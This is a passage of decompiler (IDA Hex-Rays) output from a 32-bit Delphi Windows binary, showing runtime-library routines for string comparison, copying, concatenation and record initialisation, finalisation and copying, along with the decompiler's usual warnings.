      v3 = (_DWORD *)(v2 + a2 - 4);
      v4 = (int *)(v2 + result - 4);
      v5 = -v2;
      result = *v4;
      if ( *v4 == *v3 )
      {
        while ( 1 )
        {
          v5 += 4;
          if ( v5 >= 0 )
            break;
          result = *(int *)((char *)v4 + v5);
          if ( result != *(_DWORD *)((char *)v3 + v5) )
            return result;
        }
        return 0;
      }
    }
  }
  return result;
}

//----- (004074F8) --------------------------------------------------------
int __fastcall sub_4074F8(int result)
{
  if ( !result )
    return sub_4074F8(off_4659F8[0]) + 12;
  return result;
}
// 4659F8: using guessed type int (*off_4659F8[2])[4];

//----- (00407510) --------------------------------------------------------
_DWORD *__fastcall sub_407510(int a1, int a2, int a3, _DWORD *a4)
{
  int v4; // ebx
  int v5; // edx
  int v6; // esi

  v4 = a1;
  if ( a1 )
    v4 = *(_DWORD *)(a1 - 4);
  if ( a2 >= 1 )
  {
    v5 = a2 - 1;
    if ( v4 < v5 )
      v5 = v4;
  }
  else
  {
    v5 = 0;
  }
  if ( a3 >= 0 )
  {
    v6 = v4 - v5;
    if ( a3 < v4 - v5 )
      v6 = a3;
  }
  else
  {
    v6 = 0;
  }
  if ( a1 )
    return sub_406DE4(a4, (void *)(a1 + v5), v6, *(_WORD *)(a1 - 12));
  else
    return sub_406C68(a4);
}

//----- (00407570) --------------------------------------------------------
_DWORD *__fastcall sub_407570(volatile __int32 *a1, int a2, int a3)
{
  _DWORD *result; // eax
  volatile __int32 v7; // edx
  int v8; // ecx
  bool v9; // sf
  bool v10; // of
  int v11; // esi
  int v12; // ecx

  result = (_DWORD *)sub_40717C(a1);
  v7 = *a1;
  if ( *a1 )
  {
    v8 = *(_DWORD *)(v7 - 4);
    v10 = __OFSUB__(a2, 1);
    v9 = a2 - 1 < 0;
    v11 = a2 - 1;
    if ( v9 == v10 && v11 < v8 && a3 > 0 )
    {
      v12 = v8 - v11;
      if ( a3 > v12 )
        a3 = v12;
      System::Move((const void *)(a3 + v11 + v7), (void *)(v11 + v7), v12 - a3);
      return sub_4075BC(a1, *(_DWORD *)(*a1 - 4) - a3, *(unsigned __int16 *)(*a1 - 12));
    }
  }
  return result;
}

//----- (004075BC) --------------------------------------------------------
_DWORD *__fastcall sub_4075BC(_DWORD *a1, int a2, int a3)
{
  void *v5; // edi
  _DWORD *v6; // eax
  int v7; // eax
  bool v8; // of
  int v9; // edx
  _DWORD *result; // eax
  _DWORD *v11; // eax
  int v12; // ecx
  int v13[5]; // [esp+0h] [ebp-14h] BYREF

  v13[0] = 0;
  v5 = 0;
  if ( a2 <= 0 )
  {
LABEL_11:
    result = sub_406C68(a1);
    *a1 = v5;
    return result;
  }
  v6 = (_DWORD *)*a1;
  if ( !*a1 || *(v6 - 2) != 1 )
  {
    v5 = (void *)sub_406BD8(a2, a3, a3);
    v11 = (_DWORD *)*a1;
    if ( *a1 )
    {
      v12 = *(v11 - 1);
      if ( v12 >= a2 )
        v12 = a2;
      System::Move(v11, v5, v12);
    }
    goto LABEL_11;
  }
  v7 = (int)(v6 - 3);
  v8 = __OFADD__(13, a2);
  v9 = a2 + 13;
  if ( v8 )
    sub_404ED0(5, v9, a3);
  v13[0] = v7;
  System::__linkproc__ ReallocMem((int)v13, v9);
  result = (_DWORD *)(v13[0] + 12);
  *a1 = v13[0] + 12;
  *(result - 1) = a2;
  *((_BYTE *)result + a2) = 0;
  return result;
}
// 4075BC: using guessed type int var_14[5];

//----- (00407634) --------------------------------------------------------
CHAR *__fastcall sub_407634(CHAR **a1, const WCHAR *a2, int a3, unsigned __int16 a4)
{
  BOOL *v4; // ecx

  v4 = 0;
  if ( a2 )
    v4 = (BOOL *)*((_DWORD *)a2 - 1);
  return sub_406F64(a1, a2, v4, a4);
}

//----- (004076C8) --------------------------------------------------------
void __usercall sub_4076C8(const void **a1@<eax>, int a2@<edx>, int a3)
{
  if ( a2 )
    sub_406EC0(a1, a2, *(_DWORD *)(a2 - 4), a3);
  else
    System::__linkproc__ WStrClr(a1, 0);
}
// 406C8C: using guessed type int __fastcall System::__linkproc__ WStrClr(_DWORD, _DWORD);

//----- (004076E8) --------------------------------------------------------
int *__fastcall sub_4076E8(int *result)
{
  if ( !result )
    return &dword_4076F8;
  return result;
}
// 4076F8: using guessed type int dword_4076F8;

//----- (004076FC) --------------------------------------------------------
void __fastcall sub_4076FC(int a1, int a2, int a3, BSTR *a4)
{
  int v4; // ebx
  int v5; // edx
  UINT v6; // esi

  v4 = a1;
  if ( a1 )
    v4 = *(_DWORD *)(a1 - 4) >> 1;
  if ( a2 >= 1 )
  {
    v5 = a2 - 1;
    if ( v4 < v5 )
      v5 = v4;
  }
  else
  {
    v5 = 0;
  }
  if ( a3 >= 0 )
  {
    v6 = v4 - v5;
    if ( a3 < v4 - v5 )
      v6 = a3;
  }
  else
  {
    v6 = 0;
  }
  sub_406DC0(a4, (OLECHAR *)(a1 + 2 * v5), v6);
}

//----- (00407748) --------------------------------------------------------
int __fastcall sub_407748(const void **a1, signed int a2)
{
  void *v4; // ebx
  int v5; // eax

  v4 = 0;
  if ( a2 > 0 )
  {
    v4 = (void *)System::__linkproc__ NewWideString(a2);
    v5 = (int)*a1;
    if ( *a1 )
      v5 = *(_DWORD *)(v5 - 4) >> 1;
    if ( v5 > 0 )
    {
      if ( a2 < v5 )
        v5 = a2;
      System::Move(*a1, v4, 2 * v5);
    }
  }
  return unknown_libname_45(a1, v4);
}
// 40764C: using guessed type int __fastcall unknown_libname_45(_DWORD, _DWORD);

//----- (00407790) --------------------------------------------------------
int __fastcall sub_407790(int result)
{
  if ( !result )
    return sub_4074F8((int)off_4659FC) + 12;
  return result;
}
// 4659FC: using guessed type int (*off_4659FC)[4];

//----- (00407840) --------------------------------------------------------
_DWORD *__usercall sub_407840@<eax>(_DWORD *a1@<eax>, int a2@<edx>, int a3)
{
  if ( a2 )
    return sub_406E1C(a1, a2, *(_DWORD *)(a2 - 4), a3);
  else
    return sub_406EB0(a1, 0, 0);
}

//----- (00407890) --------------------------------------------------------
_DWORD *__fastcall sub_407890(_DWORD *a1, int a2, int a3)
{
  void *v5; // edi
  _DWORD *v6; // eax
  _DWORD *v7; // eax
  bool v8; // of
  int v9; // edx
  _DWORD *result; // eax
  _DWORD *v11; // eax
  int v12; // ecx
  _DWORD *v13; // [esp-4h] [ebp-10h] BYREF

  v5 = 0;
  if ( a2 <= 0 )
  {
LABEL_12:
    result = sub_406C68(a1);
    *a1 = v5;
    return result;
  }
  v6 = (_DWORD *)*a1;
  if ( !*a1 || *(v6 - 2) != 1 )
  {
    v5 = (void *)sub_406B98(a2, a2, a3);
    v11 = (_DWORD *)*a1;
    if ( *a1 )
    {
      v12 = *(v11 - 1);
      if ( v12 >= a2 )
        v12 = a2;
      System::Move(v11, v5, 2 * v12);
    }
    goto LABEL_12;
  }
  v7 = v6 - 3;
  v8 = __OFADD__(a2, a2);
  v9 = 2 * a2;
  if ( v8 || (v8 = __OFADD__(14, v9), v9 += 14, v8) )
    sub_404ED0(5, v9, a3);
  v13 = v7;
  System::__linkproc__ ReallocMem((int)&v13, v9);
  result = v13 + 3;
  *a1 = v13 + 3;
  *(result - 1) = a2;
  *((_WORD *)result + a2) = 0;
  return result;
}

//----- (00407910) --------------------------------------------------------
volatile __int32 *__fastcall sub_407910(volatile __int32 *result, _DWORD *a2)
{
  _DWORD *v2; // ecx
  volatile __int32 *v3; // ebx
  int v5; // edi
  int v6; // edx
  _DWORD *v7; // eax
  int v8; // ecx

  if ( a2 )
  {
    v2 = (_DWORD *)*result;
    if ( *result )
    {
      v3 = result;
      v5 = *(v2 - 1);
      v6 = v5 + *(a2 - 1);
      if ( (v6 & 0xC0000000) != 0 )
        sub_404ED0(5, v6, (int)v2);
      if ( a2 == v2 )
      {
        sub_407890(result, v6, (int)v2);
        v7 = (_DWORD *)*v3;
        v8 = v5;
      }
      else
      {
        sub_407890(result, v6, (int)v2);
        v7 = a2;
        v8 = *(a2 - 1);
      }
      return (volatile __int32 *)System::Move(v7, (void *)(2 * v5 + *v3), 2 * v8);
    }
    else
    {
      return sub_406FE8(result, (int)a2);
    }
  }
  return result;
}

//----- (00407968) --------------------------------------------------------
volatile __int32 *__fastcall sub_407968(volatile __int32 *a1, _DWORD *a2, _DWORD *a3)
{
  int v6; // eax
  char *v7; // edi

  if ( !a2 )
    return sub_406FE8(a1, (int)a3);
  if ( !a3 )
    return sub_406FE8(a1, (int)a2);
  if ( a2 == *(_DWORD **)a1 )
    return sub_407910(a1, a3);
  if ( a3 == *(_DWORD **)a1 )
  {
    v6 = *(a3 - 1) + *(a2 - 1);
    if ( (v6 & 0xC0000000) != 0 )
      sub_404ED0(5, (int)a2, (int)a3);
    v7 = (char *)sub_406B98(v6, (int)a2, (int)a3);
    System::Move(a2, v7, 2 * *(a2 - 1));
    System::Move(a3, &v7[2 * *(a2 - 1)], 2 * *(a3 - 1));
    if ( v7 )
      --*((_DWORD *)v7 - 2);
    return sub_406FE8(a1, (int)v7);
  }
  else
  {
    sub_406FE8(a1, (int)a2);
    return sub_407910(a1, a3);
  }
}

//----- (004079F0) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
int __fastcall sub_4079F0(int *a1, int a2)
{
  int v2; // ebx
  int *v3; // edi
  int v4; // ecx
  int v5; // eax
  int v6; // ecx
  int v7; // esi
  int v8; // esi
  _DWORD *v9; // eax
  void *v10; // edx
  int v11; // ecx
  int v13; // [esp-4h] [ebp-20h]
  int v15; // [esp+14h] [ebp-8h]
  int v16; // [esp+18h] [ebp-4h]

  v2 = a2;
  v3 = 0;
  v4 = *(&v16 + a2);
  if ( v4 && *a1 == v4 )
  {
    v3 = (int *)*(&v16 + a2);
    v5 = *(_DWORD *)(v4 - 4);
    --a2;
  }
  else
  {
    v5 = 0;
  }
  do
  {
    v6 = *(&v16 + a2);
    if ( v6 )
    {
      v5 += *(_DWORD *)(v6 - 4);
      if ( (v5 & 0xC0000000) != 0 )
        sub_404ED0(5, a2, v6);
      if ( v3 == (int *)v6 )
        v3 = 0;
    }
    --a2;
  }
  while ( a2 );
  if ( v3 )
  {
    v7 = *(v3 - 1);
    sub_407890(a1, v5, v6);
    v3 = a1;
    v13 = *a1;
    v8 = *a1 + 2 * v7;
    --v2;
  }
  else
  {
    v13 = sub_406B98(v5, 0, v6);
    v8 = v13;
  }
  do
  {
    v9 = (_DWORD *)*(&v16 + v2);
    v10 = (void *)v8;
    if ( v9 )
    {
      v11 = 2 * *(v9 - 1);
      v8 += v11;
      System::Move(v9, v10, v11);
    }
    --v2;
  }
  while ( v2 );
  if ( !v3 )
  {
    if ( v13 )
      --*(_DWORD *)(v13 - 8);
    sub_406FE8(a1, v13);
  }
  return v15;
}
// 407A94: positive sp value 4 has been found
// 407A92: variable 'v15' is possibly undefined

//----- (00407AA0) --------------------------------------------------------
int __fastcall sub_407AA0(int result, int a2)
{
  int v2; // ecx
  int v3; // ecx
  int v4; // edx
  int v5; // ecx

  if ( result != a2 && ((a2 & result) != 0 || result && a2) )
  {
    v2 = *(_DWORD *)(result - 4);
    if ( v2 == *(_DWORD *)(a2 - 4) )
    {
      v3 = 2 * v2;
      result += v3;
      v4 = v3 + a2;
      v5 = -v3;
      while ( *(_DWORD *)(v5 + result) == *(_DWORD *)(v5 + v4) )
      {
        v5 += 4;
        if ( v5 >= 0 )
          return 0;
      }
    }
  }
  return result;
}

//----- (00407AD8) --------------------------------------------------------
_DWORD *__fastcall sub_407AD8(int a1, int a2, int a3, _DWORD *a4)
{
  int v4; // ebx
  int v5; // edx
  int v6; // esi

  v4 = a1;
  if ( a1 )
    v4 = *(_DWORD *)(a1 - 4);
  if ( a2 >= 1 )
  {
    v5 = a2 - 1;
    if ( v4 < v5 )
      v5 = v4;
  }
  else
  {
    v5 = 0;
  }
  if ( a3 >= 0 )
  {
    v6 = v4 - v5;
    if ( a3 < v4 - v5 )
      v6 = a3;
  }
  else
  {
    v6 = 0;
  }
  return sub_406D90(a4, (void *)(a1 + 2 * v5), v6);
}

//----- (00407B20) --------------------------------------------------------
_DWORD *__fastcall sub_407B20(volatile __int32 *a1, int a2, int a3)
{
  _DWORD *result; // eax
  int v7; // ebx
  int v8; // edi
  int v9; // ecx

  sub_407138(a1);
  result = (_DWORD *)*a1;
  if ( *a1 )
    result = (_DWORD *)*(result - 1);
  if ( a2 >= 1 && (int)result >= a2 && a3 > 0 )
  {
    v7 = a2 - 1;
    v8 = (int)result - v7 - a3;
    if ( v8 < 0 )
      v8 = 0;
    System::Move((const void *)(*a1 + 2 * ((_DWORD)result - v8)), (void *)(*a1 + 2 * v7), 2 * v8);
    return sub_407890(a1, v8 + v7, v9);
  }
  return result;
}
// 407B71: variable 'v9' is possibly undefined

//----- (00407B7C) --------------------------------------------------------
unsigned int __fastcall sub_407B7C(int a1, int a2, int a3)
{
  char v3; // cc
  int v4; // ecx
  int v5; // ebx
  int v6; // esi
  int v7; // ecx
  int v8; // edx
  unsigned int v9; // esi
  int v10; // ebx
  _WORD *v11; // edx
  __int16 *v12; // eax
  __int16 v13; // cx
  int v15; // esi
  _WORD *v16; // edx
  int v17; // [esp+4h] [ebp-10h]
  unsigned int v18; // [esp+8h] [ebp-Ch]

  if ( !a1 )
    return 0;
  if ( !a2 )
    return 0;
  v3 = a3 < 1;
  v4 = a3 - 1;
  if ( v3 )
    return 0;
  v5 = *(_DWORD *)(a1 - 4);
  v6 = *(_DWORD *)(a2 - 4) - v4;
  v7 = 2 * v4;
  v8 = v7 + a2;
  if ( v6 < v5 || v5 <= 0 )
    return 0;
  v9 = v8 + 2 * v6;
  v10 = 2 * (v5 - 1);
  v11 = (_WORD *)(v10 + v8);
  v18 = v9;
  v12 = (__int16 *)(v10 + a1);
  v17 = v7 - (_DWORD)v11;
  v13 = *v12;
LABEL_7:
  if ( v13 != *v11 )
  {
    if ( v13 == v11[1] )
      goto LABEL_17;
    goto LABEL_9;
  }
  while ( 1 )
  {
    --v11;
LABEL_17:
    v15 = -v10;
    if ( !v10 )
      break;
    while ( *(_DWORD *)((char *)v12 + v15) == *(_DWORD *)((char *)v11 + v15 + 2) )
    {
      if ( v15 >= -4 )
        goto LABEL_22;
      if ( *(_DWORD *)((char *)v12 + v15 + 4) != *(_DWORD *)((char *)v11 + v15 + 6) )
        break;
      v3 = (v15 + 8 < 0) ^ __OFADD__(8, v15);
      v15 += 8;
      if ( !v3 )
        goto LABEL_22;
    }
LABEL_9:
    v11 += 4;
    if ( (unsigned int)v11 >= v18 )
    {
      v11 -= 2;
      if ( (unsigned int)v11 >= v18 )
        return 0;
      goto LABEL_7;
    }
    if ( v13 != *(v11 - 2) )
    {
      if ( v13 != *(v11 - 1) )
        goto LABEL_7;
      ++v11;
    }
    v11 -= 2;
  }
LABEL_22:
  v16 = v11 + 2;
  if ( (unsigned int)v16 > v18 )
    return 0;
  return ((unsigned int)v16 + v17) >> 1;
}
// 407B7C: could not find valid save-restore pair for ebx
// 407B7C: could not find valid save-restore pair for esi

//----- (00407CFC) --------------------------------------------------------
CHAR *__fastcall sub_407CFC(CHAR **a1, const WCHAR *a2, BOOL *a3, unsigned __int16 a4)
{
  return sub_406F64(a1, a2, a3, a4);
}

//----- (00407D10) --------------------------------------------------------
char __fastcall sub_407D10(int a1, int a2)
{
  int v2; // ecx
  int v3; // ebx
  int v4; // esi
  int v5; // edi

  v2 = *(unsigned __int8 *)(a2 + 1);
  v3 = a1;
  v4 = v2 + a2 + 10;
  v5 = *(_DWORD *)(v2 + a2 + 6);
  if ( v5 )
  {
    do
    {
      if ( *(_DWORD *)v4 )
        LOBYTE(a1) = sub_407D48((_DWORD *)(v3 + *(_DWORD *)(v4 + 4)), **(_BYTE ***)v4, 1);
      v4 += 8;
    }
    while ( v5-- > 1 );
  }
  return a1;
}

//----- (00407D48) --------------------------------------------------------
char __fastcall sub_407D48(_DWORD *a1, _BYTE *a2, int a3)
{
  _DWORD *v3; // ebx
  int v5; // edi
  int v6; // edx
  int v7; // ecx
  bool v8; // cc
  int v9; // ebp
  _DWORD *v10; // eax
  int v11; // ebp
  _DWORD *v12; // eax

  if ( a3 )
  {
    v3 = a1;
    v5 = a3;
    LOBYTE(a1) = *a2;
    v6 = (unsigned __int8)a2[1];
    v7 = 0;
    switch ( (_BYTE)a1 )
    {
      case 0xA:
      case 0xB:
        do
        {
LABEL_11:
          *v3++ = 0;
          v8 = v5-- <= 1;
        }
        while ( !v8 );
        return (char)a1;
      case 0xC:
        do
        {
          *v3 = 0;
          v3[1] = 0;
          v3[2] = 0;
          v3[3] = 0;
          v3 += 4;
          v8 = v5-- <= 1;
        }
        while ( !v8 );
        break;
      case 0xD:
        v9 = v6;
        do
        {
          v10 = v3;
          v3 = (_DWORD *)((char *)v3 + *(_DWORD *)&a2[v9 + 2]);
          LOBYTE(a1) = sub_407D48(v10, **(_DWORD **)&a2[v9 + 10], *(_DWORD *)&a2[v9 + 6]);
          v8 = v5-- <= 1;
        }
        while ( !v8 );
        break;
      case 0xE:
        v11 = v6;
        do
        {
          v12 = v3;
          v3 = (_DWORD *)((char *)v3 + *(_DWORD *)&a2[v11 + 2]);
          LOBYTE(a1) = sub_407D10(v12, a2, v7);
          v8 = v5-- <= 1;
        }
        while ( !v8 );
        break;
      case 0xF:
      case 0x11:
      case 0x12:
        goto LABEL_11;
      default:
        sub_404ED0(2, v6, 0);
    }
  }
  return (char)a1;
}
// 407DD2: variable 'v7' is possibly undefined
// 407D10: using guessed type int __fastcall sub_407D10(_DWORD, _DWORD, _DWORD);

//----- (00407DEC) --------------------------------------------------------
int __fastcall sub_407DEC(int a1, int a2)
{
  int v2; // ecx
  int v4; // esi
  int v5; // edi
  bool v6; // cc
  int v7; // esi
  int v8; // edi
  _BYTE *v9; // edx

  v2 = *(unsigned __int8 *)(a2 + 1);
  v4 = v2 + a2 + 10;
  v5 = *(_DWORD *)(v2 + a2 + 6);
  if ( v5 )
  {
    while ( *(_DWORD *)v4 )
    {
      sub_407E64(a1 + *(_DWORD *)(v4 + 4), **(_DWORD **)v4, 1);
      v4 += 8;
      v6 = v5-- <= 1;
      if ( v6 )
        return a1;
    }
    v7 = v4 + 8;
    v8 = v5 - 1;
    do
    {
      v9 = **(_BYTE ***)v7;
      if ( *v9 != 15 )
        sub_404ED0(2, (int)v9, v2);
      sub_40AFB0((int *)(a1 + *(_DWORD *)(v7 + 4)));
      v7 += 8;
      v6 = v8-- <= 1;
    }
    while ( !v6 );
  }
  return a1;
}
// 407E35: variable 'v2' is possibly undefined
// 407E64: using guessed type int __fastcall sub_407E64(_DWORD, _DWORD, _DWORD);

//----- (00407E64) --------------------------------------------------------
_DWORD *__fastcall sub_407E64(_DWORD *result, char *a2, int a3)
{
  _DWORD *v3; // ebx
  int v5; // edi
  char v6; // al
  int v7; // edx
  _DWORD *v8; // eax
  bool v9; // cc
  int v10; // ebp
  _DWORD *v11; // eax
  int v12; // ebp
  int v13; // eax
  _DWORD *v14; // eax
  _DWORD *v15; // eax
  _DWORD *v16; // [esp-4h] [ebp-4h]

  if ( a3 )
  {
    v16 = result;
    v3 = result;
    v5 = a3;
    v6 = *a2;
    v7 = (unsigned __int8)a2[1];
    switch ( v6 )
    {
      case 10:
        if ( a3 > 1 )
          sub_406CD4((int)v3, a3);
        else
          sub_406C68(v3);
        break;
      case 18:
        if ( a3 > 1 )
          sub_406CA4((int)v3, a3);
        else
          sub_406C44(v3);
        break;
      case 11:
        if ( a3 > 1 )
          System::__linkproc__ WStrArrayClr(v3, a3);
        else
          System::__linkproc__ WStrClr(v3, v7);
        break;
      case 12:
        do
        {
          v8 = v3;
          v3 += 4;
          unknown_libname_54(v8, v7);
          v9 = v5-- <= 1;
        }
        while ( !v9 );
        break;
      case 13:
        v10 = v7;
        do
        {
          v11 = v3;
          v3 = (_DWORD *)((char *)v3 + *(_DWORD *)&a2[v10 + 2]);
          sub_407E64(v11, **(_DWORD **)&a2[v10 + 10], *(_DWORD *)&a2[v10 + 6]);
          v9 = v5-- <= 1;
        }
        while ( !v9 );
        break;
      case 14:
        v12 = v7;
        do
        {
          v13 = (int)v3;
          v3 = (_DWORD *)((char *)v3 + *(_DWORD *)&a2[v12 + 2]);
          sub_407DEC(v13, (int)a2);
          v9 = v5-- <= 1;
        }
        while ( !v9 );
        break;
      case 15:
        do
        {
          v14 = v3++;
          System::__linkproc__ IntfClear(v14);
          v9 = v5-- <= 1;
        }
        while ( !v9 );
        break;
      case 17:
        do
        {
          v15 = v3++;
          sub_408B34(v15, a2);
          v9 = v5-- <= 1;
        }
        while ( !v9 );
        break;
      default:
        sub_404ED0(2, v7, a3);
    }
    return v16;
  }
  return result;
}
// 407F05: variable 'v7' is possibly undefined
// 406C8C: using guessed type int __fastcall System::__linkproc__ WStrClr(_DWORD, _DWORD);
// 406D04: using guessed type int __fastcall System::__linkproc__ WStrArrayClr(_DWORD, _DWORD);
// 407E4C: using guessed type int __fastcall unknown_libname_54(_DWORD, _DWORD);
// 408B34: using guessed type int __fastcall sub_408B34(_DWORD, _DWORD);
// 40A04C: using guessed type int __fastcall System::__linkproc__ IntfClear(_DWORD);

//----- (00407F98) --------------------------------------------------------
int __fastcall sub_407F98(int a1, int a2, int a3)
{
  unsigned __int32 v5; // edi
  int v6; // ebp
  int result; // eax
  int v8; // ecx
  int v9; // ecx
  int v10; // ecx
  bool v11; // cc
  int v12; // ecx
  int v13; // eax
  char *v14; // edx
  char v15; // cl
  int v16; // eax
  int v17; // ecx
  int v18; // edx
  int *v19; // eax
  int v20; // ecx
  int v21; // [esp-8h] [ebp-20h]
  int v22; // [esp-8h] [ebp-20h]
  int v23; // [esp-4h] [ebp-1Ch]
  _DWORD *v24; // [esp+0h] [ebp-18h]
  __int32 v25[5]; // [esp+4h] [ebp-14h] BYREF

  v25[0] = 0;
  v5 = *(unsigned __int8 *)(a3 + 1) + a3 + 10;
  v6 = *(_DWORD *)(*(unsigned __int8 *)(a3 + 1) + a3 + 6);
  result = 0;
  v8 = *(_DWORD *)(*(unsigned __int8 *)(a3 + 1) + a3 + 2);
  if ( v6 )
  {
    v23 = v8;
    v9 = v6;
    v24 = (_DWORD *)(v5 + 8 * v6);
    v25[0] = (__int32)v24;
    while ( *(_DWORD *)(v5 + 8 * v9 - 8) )
    {
      if ( !--v9 )
        goto LABEL_7;
    }
    v25[0] = v5 + 8 * v9;
    --v6;
    do
    {
LABEL_7:
      if ( (_DWORD *)v25[0] != v24
        && *(_DWORD *)v25[0]
        && (!*(_DWORD *)v5 || *(_DWORD *)(v25[0] + 4) <= *(_DWORD *)(v5 + 4)) )
      {
        v5 = _InterlockedExchange(v25, v5);
      }
      v10 = *(_DWORD *)(v5 + 4);
      v11 = v10 <= result;
      v12 = v10 - result;
      if ( !v11 )
        System::Move((const void *)(a2 + result), (void *)(a1 + result), v12);
      v13 = *(_DWORD *)(v5 + 4);
      v14 = **(char ***)v5;
      v15 = *v14;
      if ( *v14 == 15 )
      {
        v18 = *(_DWORD *)(v13 + a2);
        v19 = (int *)(a1 + v13);
        if ( v5 < v25[0] )
          System::__linkproc__ IntfCopy(v19, v18);
        else
          sub_40AFDC(v19, v18);
        v16 = 4;
      }
      else
      {
        if ( v5 > v25[0] )
          goto LABEL_23;
        switch ( v15 )
        {
          case 10:
            sub_407084((volatile __int32 *)(a1 + v13), *(_DWORD *)(v13 + a2));
            v16 = 4;
            break;
          case 11:
            System::__linkproc__ WStrAsg((BSTR *)(a1 + v13), *(OLECHAR **)(v13 + a2));
            v16 = 4;
            break;
          case 18:
            sub_406FE8((volatile __int32 *)(a1 + v13), *(_DWORD *)(v13 + a2));
            v16 = 4;
            break;
          case 12:
            unknown_libname_56(a1 + v13, v13 + a2);
            v16 = 16;
            break;
          case 13:
            v17 = (unsigned __int8)v14[1];
            v21 = *(_DWORD *)&v14[v17 + 2];
            sub_408304(*(_DWORD *)&v14[v17 + 6]);
            v16 = v21;
            break;
          case 14:
            sub_407F98(a1 + v13, v13 + a2, v14, v23, *(_DWORD *)&v14[(unsigned __int8)v14[1] + 2]);
            v16 = v22;
            break;
          case 17:
            sub_408B78((int *)(a1 + v13), *(_DWORD *)(v13 + a2), **(_DWORD **)v5);
            v16 = 4;
            break;
          default:
LABEL_23:
            sub_404ED0(2, (int)v14, v23);
        }
      }
      result = *(_DWORD *)(v5 + 4) + v16;
      v5 += 8;
      --v6;
    }
    while ( v6 );
    v8 = v23;
  }
  v11 = v8 <= result;
  v20 = v8 - result;
  if ( !v11 )
    return System::Move((const void *)(a2 + result), (void *)(result + a1), v20);
  return result;
}
// 40805E: variable 'v23' is possibly undefined
// 4080E3: variable 'v22' is possibly undefined
// 407F80: using guessed type int __fastcall unknown_libname_56(_DWORD, _DWORD);
// 408304: using guessed type _DWORD __stdcall sub_408304(_DWORD);
// 40A064: using guessed type int __fastcall System::__linkproc__ IntfCopy(_DWORD, _DWORD);
// 407F98: using guessed type __int32 var_14[5];

//----- (00408140) --------------------------------------------------------
unsigned int __fastcall sub_408140(int a1, int a2, int a3)
{
  int v3; // ebx
  unsigned int v4; // edi
  int v5; // eax
  unsigned int v6; // ebp
  int v7; // esi
  unsigned int v8; // esi
  unsigned int v9; // eax
  int v10; // edi
  unsigned __int8 *v11; // eax
  unsigned __int8 *v12; // esi
  unsigned __int8 *v13; // esi
  unsigned int result; // eax
  unsigned int v17; // [esp+8h] [ebp-20h]
  int *v18; // [esp+Ch] [ebp-1Ch]
  int *v19; // [esp+10h] [ebp-18h]
  int v20; // [esp+14h] [ebp-14h]

  v3 = a3 + *(unsigned __int8 *)(a3 + 1);
  v4 = 0;
  v5 = *(_DWORD *)(v3 + 6);
  if ( v5 )
  {
    v6 = *(_DWORD *)(v3 + 6);
    v7 = v5 - 1;
    while ( *(_DWORD *)(v3 + 8 * v7 + 10) )
    {
      if ( --v7 == -1 )
        goto LABEL_6;
    }
    v6 = v7 + 1;
    --v5;
LABEL_6:
    v17 = 0;
    v20 = v5;
    do
    {
      if ( *(_DWORD *)(v3 + 8 * v17 + 10)
        && (v6 == *(_DWORD *)(v3 + 6) || *(_DWORD *)(v3 + 8 * v17 + 14) < *(_DWORD *)(v3 + 8 * v6 + 14)) )
      {
        v8 = v17++;
      }
      else
      {
        v8 = v6++;
      }
      v9 = *(_DWORD *)(v3 + 8 * v8 + 14);
      if ( v4 < v9 )
        System::Move((const void *)(v4 + a2), (void *)(v4 + a1), v9 - v4);
      v10 = *(_DWORD *)(v3 + 8 * v8 + 14);
      v11 = **(unsigned __int8 ***)(v3 + 8 * v8 + 10);
      v18 = (int *)(v10 + a1);
      v19 = (int *)(v10 + a2);
      switch ( *v11 )
      {
        case 7u:
        case 0xAu:
        case 0xBu:
        case 0xCu:
        case 0x11u:
        case 0x12u:
          *v18 = *v19;
          v4 = v10 + 4;
          break;
        case 8u:
          *v18 = *v19;
          a3 = v19[1];
          v18[1] = a3;
          v4 = v10 + 8;
          break;
        case 0xDu:
          v12 = &v11[v11[1]];
          sub_40841C(*(_DWORD *)(v12 + 6));
          v4 = *(_DWORD *)(v12 + 2) + v10;
          break;
        case 0xEu:
          v13 = &v11[v11[1]];
          sub_408140(v18, v19, v11);
          v4 = *(_DWORD *)(v13 + 2) + v10;
          break;
        case 0xFu:
          if ( v8 <= v17 )
          {
            *v18 = *v19;
          }
          else
          {
            sub_40AFDC(v18, *v19);
            sub_40AFB0(v19);
          }
          v4 = v10 + 4;
          break;
        default:
          sub_404ED0(2, *v11 - 7, a3);
      }
      --v20;
    }
    while ( v20 );
  }
  result = *(_DWORD *)(v3 + 2);
  if ( v4 < result )
    return System::Move((const void *)(v4 + a2), (void *)(v4 + a1), result - v4);
  return result;
}
// 4082D0: variable 'a3' is possibly undefined
// 40841C: using guessed type _DWORD __stdcall sub_40841C(_DWORD);

//----- (00408304) --------------------------------------------------------
int __fastcall sub_408304(volatile __int32 *a1, __int32 *a2, char *a3, int a4)
{
  char v8; // cl
  int result; // eax
  char *v10; // edi

  v8 = *a3;
  switch ( v8 )
  {
    case 10:
      do
      {
        result = (int)sub_407084(a1++, *a2++);
        --a4;
      }
      while ( a4 );
      break;
    case 11:
      do
      {
        result = System::__linkproc__ WStrAsg((BSTR *)a1++, (OLECHAR *)*a2++);
        --a4;
      }
      while ( a4 );
      break;
    case 18:
      do
      {
        result = (int)sub_406FE8(a1++, *a2++);
        --a4;
      }
      while ( a4 );
      break;
    case 12:
      do
      {
        result = unknown_libname_56(a1, a2);
        a1 += 4;
        a2 += 4;
        --a4;
      }
      while ( a4 );
      break;
    case 13:
      v10 = &a3[(unsigned __int8)a3[1] + 2];
      do
      {
        result = sub_408304(*((_DWORD *)v10 + 1));
        a1 = (volatile __int32 *)((char *)a1 + *(_DWORD *)v10);
        a2 = (__int32 *)((char *)a2 + *(_DWORD *)v10);
        --a4;
      }
      while ( a4 );
      break;
    case 14:
      do
      {
        sub_407F98((int)a1, (int)a2, (int)a3);
        result = (unsigned __int8)a3[1];
        a1 = (volatile __int32 *)((char *)a1 + *(_DWORD *)&a3[result + 2]);
        a2 = (__int32 *)((char *)a2 + *(_DWORD *)&a3[result + 2]);
        --a4;
      }
      while ( a4 );
      break;
    case 15:
      do
      {
        result = System::__linkproc__ IntfCopy(a1++, *a2++);
        --a4;
      }
      while ( a4 );
      break;
    case 17:
      do
      {
        result = (int)sub_408B78((int *)a1++, *a2++, (int)a3);
        --a4;
      }
      while ( a4 );
      break;
    default:
      JUMPOUT(0x404ED0);
  }
  return result;
}
// 40834E: control flows out of bounds to 404ED0
// 407F80: using guessed type int __fastcall unknown_libname_56(_DWORD, _DWORD);
// 40A064: using guessed type int __fastcall System::__linkproc__ IntfCopy(_DWORD, _DWORD);

//----- (0040841C) --------------------------------------------------------
